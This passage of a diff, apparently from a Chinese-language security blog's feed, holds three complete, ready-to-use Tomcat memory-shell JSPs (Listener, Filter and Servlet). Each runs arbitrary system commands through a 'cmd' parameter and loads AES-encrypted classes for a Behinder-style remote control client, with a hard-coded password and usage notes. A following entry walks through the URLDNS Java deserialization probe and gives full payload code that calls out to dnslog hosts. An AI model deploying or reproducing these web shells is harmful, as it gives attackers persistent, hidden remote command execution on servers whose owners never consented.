+                        response.getOutputStream().close();
+                    }
+                }
+                ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();
+
+                if (request.getMethod().equals("POST")) {
+                    if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                        Class Lclass = cl.getClass().getSuperclass();
+                        RushThere(Lclass, cl, session, request, pageContext);
+                    } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                        Class Lclass = cl.getClass().getSuperclass().getSuperclass();
+                        RushThere(Lclass, cl, session, request, pageContext);
+                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
+                        RushThere(Lclass, cl, session, request, pageContext);
+                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                        RushThere(Lclass, cl, session, request, pageContext);
+                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                        RushThere(Lclass, cl, session, request, pageContext);
+                    } else {
+                        Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                        RushThere(Lclass, cl, session, request, pageContext);
+                    }
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+
+        public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
+            byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
+            try {
+
+                Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                define.setAccessible(true);
+                Class uclass = null;
+                try {
+                    uclass = cl.loadClass("U");
+                } catch (ClassNotFoundException e) {
+                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
+                }
+                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
+                constructor.setAccessible(true);
+                Object u = constructor.newInstance(this.getClass().getClassLoader());
+                Method Um = uclass.getDeclaredMethod("g", byte[].class);
+                Um.setAccessible(true);
+                String k = passwd;
+                session.setAttribute("u", k);
+                Cipher c = Cipher.getInstance("AES");
+                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+                byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                Class eclass = (Class) Um.invoke(u, eClassBytes);
+                Object a = eclass.newInstance();
+                Method b = eclass.getDeclaredMethod("equals", Object.class);
+                b.setAccessible(true);
+                b.invoke(a, pageContext);
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+        }
+
+        @Override
+        public void requestDestroyed(ServletRequestEvent sre) {
+        }
+    }
+
+    LanListener lanListener = new LanListener();
+%>
+
+<%
+    RequestFacade requestFacade = (RequestFacade) request;
+    Class requestFacadeClass = requestFacade.getClass();
+    Field getRequestField = requestFacadeClass.getDeclaredField("request");
+    getRequestField.setAccessible(true);
+    Request getRequest = (Request) getRequestField.get(requestFacade);
+    StandardContext standardContext = (StandardContext) getRequest.getContext();
+    standardContext.addApplicationEventListener(lanListener);
+%>
+
+```
+### 3.2.2、Filter
+```
+<%@ page import="org.apache.catalina.connector.RequestFacade" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.util.HashMap" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
+<%@ page import="java.lang.reflect.Constructor" %>
+<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
+<%@ page import="org.apache.catalina.Context" %>
+<%@ page import="java.util.Map" %>
+<%@ page import="java.lang.reflect.Method" %>
+<%@ page import="javax.crypto.Cipher" %>
+<%@ page import="javax.crypto.spec.SecretKeySpec" %>
+<%@ page import="java.io.BufferedReader" %>
+<%@ page import="java.io.InputStreamReader" %>
+<%@page language="java" contentType="text/html; charset=UTF-8" %>
+
+<%--
+/**
+ * 不用改了
+ * 标准的cmd内存马&冰蝎马
+ * 用法:
+ *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
+ *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
+ *
+ * 2023/08/03
+ */
+--%>
+<%
+    class LanMyFilter implements Filter {
+
+        String passwd = "73f50c9f17291ce9";
+
+        @Override
+        public void init(FilterConfig filterConfig) throws ServletException {
+        }
+
+        @Override
+        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+            String command = servletRequest.getParameter("cmd");
+            if (command != null){
+                String system = System.getProperty("os.name");
+                if (system.toLowerCase().contains("win")) {
+                    Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
+                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    StringBuilder stringBuilder = new StringBuilder();
+                    String line;
+                    while ((line = bufferedReader.readLine()) != null) {
+                        stringBuilder.append(line + '\n');
+                    }
+
+                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                    servletResponse.getOutputStream().flush();
+                    servletResponse.getOutputStream().close();
+                } else {
+                    Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
+                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    StringBuilder stringBuilder = new StringBuilder();
+                    String line;
+                    while ((line = bufferedReader.readLine()) != null) {
+                        stringBuilder.append(line + '\n');
+                    }
+
+                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                    servletResponse.getOutputStream().flush();
+                    servletResponse.getOutputStream().close();
+                }
+            }
+
+            HttpServletRequest request = (HttpServletRequest) servletRequest;
+            HttpServletResponse response = (HttpServletResponse) servletResponse;
+            HttpSession session = request.getSession();
+
+            Map<String, Object> pageContext = new HashMap<String, Object>();
+            pageContext.put("session", session);
+            pageContext.put("request", request);
+            pageContext.put("response", response);
+
+            ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();
+
+            if (request.getMethod().equals("POST")) {
+                if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                }
+                filterChain.doFilter(servletRequest, servletResponse);
+            }
+            filterChain.doFilter(servletRequest,servletResponse);
+        }
+
+        public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map<String, Object> pageContext){
+            byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
+            try {
+
+                Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                define.setAccessible(true);
+                Class uclass = null;
+                try {
+                    uclass = cl.loadClass("U");
+                } catch (ClassNotFoundException e) {
+                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
+                }
+                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
+                constructor.setAccessible(true);
+                Object u = constructor.newInstance(this.getClass().getClassLoader());
+                Method Um = uclass.getDeclaredMethod("g", byte[].class);
+                Um.setAccessible(true);
+                String k = passwd;
+                session.setAttribute("u", k);
+                Cipher c = Cipher.getInstance("AES");
+                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+                byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                Class eclass = (Class) Um.invoke(u, eClassBytes);
+                Object a = eclass.newInstance();
+                Method b = eclass.getDeclaredMethod("equals", Object.class);
+                b.setAccessible(true);
+                b.invoke(a, pageContext);
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+        }
+
+        @Override
+        public void destroy() {
+        }
+    }
+
+    LanMyFilter lanMyFilter = new LanMyFilter();
+    String filterName = "lan";
+%>
+
+<%
+    RequestFacade requestFacade = (RequestFacade) request;
+    Class requestFacadeClass = requestFacade.getClass();
+    Field getRequestField = requestFacadeClass.getDeclaredField("request");
+    getRequestField.setAccessible(true);
+    Request getRequest = (Request) getRequestField.get(requestFacade);
+    StandardContext standardContext = (StandardContext) getRequest.getContext();
+%>
+
+<%
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilterName(filterName);
+    filterDef.setFilterClass(lanMyFilter.getClass().getName());
+    filterDef.setFilter(lanMyFilter);
+    filterDef.setAsyncSupported("true");
+    standardContext.addFilterDef(filterDef);
+%>
+
+<%
+    FilterMap filterMap = new FilterMap();
+    filterMap.addURLPattern("/*");
+    filterMap.setFilterName(filterName);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+    standardContext.addFilterMap(filterMap);
+%>
+
+<%
+    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+    constructor.setAccessible(true);
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+%>
+
+<%
+    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
+    filterConfigsField.setAccessible(true);
+    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
+    filterConfigs.put(filterName,filterConfig);
+%>
+
+```
+### 3.2.3、Servlet
+```
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.catalina.Wrapper" %>
+<%@ page import="org.apache.catalina.connector.RequestFacade" %>
+<%@ page import="java.io.BufferedReader" %>
+<%@ page import="java.io.InputStreamReader" %>
+<%@ page import="java.util.Map" %>
+<%@ page import="java.util.HashMap" %>
+<%@ page import="java.lang.reflect.Method" %>
+<%@ page import="java.lang.reflect.Constructor" %>
+<%@ page import="javax.crypto.Cipher" %>
+<%@ page import="javax.crypto.spec.SecretKeySpec" %>
+<%@ page import="java.util.logging.Filter" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+
+<%--
+/**
+ * 不用改了
+ * 标准的cmd内存马&冰蝎马
+ * 用法:
+ *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
+ *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
+ *
+ * 2023/08/03
+ */
+--%>
+<%!
+    public class LanServlet implements Servlet {
+
+        String passwd = "73f50c9f17291ce9";
+
+        @Override
+        public void init(ServletConfig config) throws ServletException {
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
+            String command = servletRequest.getParameter("cmd");
+            if (command != null){
+                String system = System.getProperty("os.name");
+                if (system.toLowerCase().contains("win")) {
+                    Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
+                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    StringBuilder stringBuilder = new StringBuilder();
+                    String line;
+                    while ((line = bufferedReader.readLine()) != null) {
+                        stringBuilder.append(line + '\n');
+                    }
+
+                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                    servletResponse.getOutputStream().flush();
+                    servletResponse.getOutputStream().close();
+                } else {
+                    Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
+                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    StringBuilder stringBuilder = new StringBuilder();
+                    String line;
+                    while ((line = bufferedReader.readLine()) != null) {
+                        stringBuilder.append(line + '\n');
+                    }
+
+                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                    servletResponse.getOutputStream().flush();
+                    servletResponse.getOutputStream().close();
+                }
+            }
+
+            HttpServletRequest request = (HttpServletRequest) servletRequest;
+            HttpServletResponse response = (HttpServletResponse) servletResponse;
+            HttpSession session = request.getSession();
+
+            Map<String, Object> pageContext = new HashMap<String, Object>();
+            pageContext.put("session", session);
+            pageContext.put("request", request);
+            pageContext.put("response", response);
+
+            ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();
+
+            if (request.getMethod().equals("POST")) {
+                if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    //从java.lang.ClassLoader中获取到Class对象
+                    Class Lclass = cl.getClass().getSuperclass();
+                    //调用RushThere()方法，注入内存马
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                } else {
+                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
+                    RushThere(Lclass, cl, session, request, pageContext);
+                }
+            }
+        }
+
+        public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
+            byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
+            try {
+
+                Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                define.setAccessible(true);
+                Class uclass = null;
+                try {
+                    uclass = cl.loadClass("U");
+                } catch (ClassNotFoundException e) {
+                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
+                }
+                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
+                constructor.setAccessible(true);
+                Object u = constructor.newInstance(this.getClass().getClassLoader());
+                Method Um = uclass.getDeclaredMethod("g", byte[].class);
+                Um.setAccessible(true);
+                String k = passwd;
+                session.setAttribute("u", k);
+                Cipher c = Cipher.getInstance("AES");
+                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
+                byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                Class eclass = (Class) Um.invoke(u, eClassBytes);
+                Object a = eclass.newInstance();
+                Method b = eclass.getDeclaredMethod("equals", Object.class);
+                b.setAccessible(true);
+                b.invoke(a, pageContext);
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+        }
+    }
+
+    LanServlet lanServlet = new LanServlet();
+%>
+
+<%
+    RequestFacade requestFacade = (RequestFacade) request;
+    Class requestFacadeClass = requestFacade.getClass();
+    Field getRequestField = requestFacadeClass.getDeclaredField("request");
+    getRequestField.setAccessible(true);
+    Request getRequest = (Request) getRequestField.get(requestFacade);
+    StandardContext standardContext = (StandardContext) getRequest.getContext();
+%>
+
+<%
+    String name = "lanServlet";
+
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setName(name);
+    wrapper.setServlet(lanServlet);
+%>
+
+<%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded("/lan",name);
+%>
+
+```
+# 学习
+https://xz.aliyun.com/t/10696#toc-4
+
+https://github.com/ce-automne/TomcatMemShell/blob/main/DeSerialize/filter/tomcat89/IFRain.java
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>内存马</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>URLDNS</title>
+    <url>/2023/08/22/URLDNS/</url>
+    <content><![CDATA[# URLDNS
+## 简述
+URLDNS的作用只有一个，判断目标系统上否存在 Java 反序列化漏洞，而且不限制jdk版本
+## 原理
+java.util.HashMap实现了Serializeble接口且重写了readObject()方法；在反序列化的时候回调用了putVal()方法，就会触发dns请求
+## 分析
+首先查看HashMap类，实现了Serializable接口
+
+![](https://s3.hedgedoc.org/demo/uploads/fa4719a2-3e6a-4522-a189-ff2811b3aaf0.png)
+
+然后搜索readObject()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/74d92c61-f535-43f1-bf31-b319395bef84.png)
+
+可以看到，这里的readObject()方法已经被重写了，而方法的最后，调用了putVal()方法，而putVal()方法又调用来了hash()方法，并传入了一个key，我们跟进hash()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/7db43df5-3b3e-4c5c-b3ed-5f25985e81a9.png)
+
+
+hash()方法传入了一个key对象，最后又调用了key.hashCode()方法
+
+而我们这个key对象，是一个URL对象，我们跟进URL.hashCode()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/85a50495-8dcb-4c1d-93de-f7f1cb187586.png)
+
+可以看到，首先判断hashCode是否为-1，如果不是，就直接返回hashCode；如果是，就将URL对象传入handler.hashCode()方法并调用得到hashCode
+
+![](https://s3.hedgedoc.org/demo/uploads/ef3ee57b-a18b-4984-8808-e30a9c185646.png)
+
+而hashCode的值默认为-1，我们跟进handler.hashCode()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/c3d4e73e-f07a-4d03-a0a4-f4ee714776db.png)
+
+这里最终传入URL对象u，并调用了getHostAddress()方法，我们跟进getHostAddress()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/8c024d04-e39e-48f0-ad88-27e13c544fdf.png)
+
+最终，URL对象传入getHostAddress()方法，并在436行调用getByName()方法，触发了dns请求
+
+调用链如下：
+1. HashMap.readObject()
+2. HashMap.putVal()
+3. HashMap.hash()
+4. URL.hashCode()
+5. URLStreamHandler.hashCode()
+6. URLStreamHandler.getHostAddress()
+
+## payload编写逻辑
+根据上面的分析，写一个简单的demo
+
+```
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.util.HashMap;
+
+public class URLDNS {
+
+    public static void main(String[] args) throws MalformedURLException {
+        URL url = new URL("http://d6tzs5.dnslog.cn");
+        HashMap hashMap = new HashMap();
+        hashMap.put(url,"lantest");
+
+        try {
+            FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
+            ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
+            xlh.writeObject(hashMap);
+            xlh.close();
+            fileOutputStream.close();
+
+            FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
+            ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
+            fxlh.readObject();
+            fxlh.close();
+            fileInputStream.close();
+        }catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+```
+效果：
+
+![](https://s3.hedgedoc.org/demo/uploads/76ec1eec-651f-46c6-9f13-4ccd84a855e3.png)
+
+但是这里有两个dns请求，我们要的效果是在反序列化的时候触发dns请求，所以说只能有一个dns请求，不过我们在将URL对象存入HashMap对象的时候（HashMap.put()方法），也会调用HashMap.putVal()方法，而调用链的最后，也会触发dns请求，这个得规避一下
+
+![](https://s3.hedgedoc.org/demo/uploads/58f44f15-5cf1-4148-bf64-2b19c1c3db4e.png)
+
+根据上面的调用链分析，当进入到URL.hashCode()方法的时候，会判断URL.hashCode这个成员变量的值是否为-1，如果不等于-1，那就直接返回hashCode的值（-1），就不会进行接下来的dns请求
+
+![](https://s3.hedgedoc.org/demo/uploads/6856989b-d8d0-43b2-9c20-63ed354ed144.png)
+
+不过我们查看URL.hashCode这个成员变量，是用private修饰，无法直接改，只能用反射修改
+
+```
+try {
+    Class uClass = Class.forName("java.net.URL");
+    Field field = uClass.getDeclaredField("hashCode");
+    field.setAccessible(true);
+    //设置URL.hashCode的值为666，这样就不会进入请求dns的调用链
+    field.set(url,666);
+}catch (Exception e) {
+    e.printStackTrace();
+}
+
+```
+
+还有个问题，将URL对象添加到HashMap对象后，需要正常的进入后面的dns请求的调用链，所以我们还要将URL.hashCode的值改回来
+
+```
+field.set(field,-1);
+```
+## 完整代码
+```
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.util.HashMap;
+
+public class URLDNS {
+
+    public static void main(String[] args) throws MalformedURLException {
+        URL url = new URL("http://ed1se9.dnslog.cn");
+        HashMap hashMap = new HashMap();
+
+        try {
+            Class uClass = Class.forName("java.net.URL");
+            Field field = uClass.getDeclaredField("hashCode");
+            field.setAccessible(true);
+            //设置URL.hashCode的值为666，这样就不会进入请求dns的调用链
+            field.set(url,666);
+            hashMap.put(url, "lantest");
+            field.set(url,-1);
+
+            FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
+            ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
+            xlh.writeObject(hashMap);
+            xlh.close();
+            fileOutputStream.close();
+
+            FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
+            ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
+            fxlh.readObject();
+            fxlh.close();
+            fileInputStream.close();
+        }catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+```
+
 
 
 
